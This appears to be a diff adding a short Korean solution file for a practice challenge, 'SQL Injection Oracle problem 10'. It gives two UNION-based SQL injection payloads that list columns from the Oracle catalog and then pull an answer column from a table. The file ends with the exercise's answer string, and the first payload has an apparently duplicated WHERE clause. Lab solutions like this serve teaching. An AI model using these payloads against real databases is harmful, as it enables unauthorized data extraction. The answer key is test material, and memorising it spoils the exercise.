@@ -1,0 +1,15 @@
+=============================
+
+SQL Injection Oracle 문제 10번
+
+=============================
+
+10번
+
+1.
+삼성동%' union select column_name,'','','','' from cols where table_name = 'SQL_UNION_ANSWER' where 'j%'='j 
+삼성동%' union select ANSWER_COLUMN ,'','','','' from SQL_UNION_ANSWER  where 'j%'='j
+2. 정답
+this_is_perfect_answer
+
+=============================
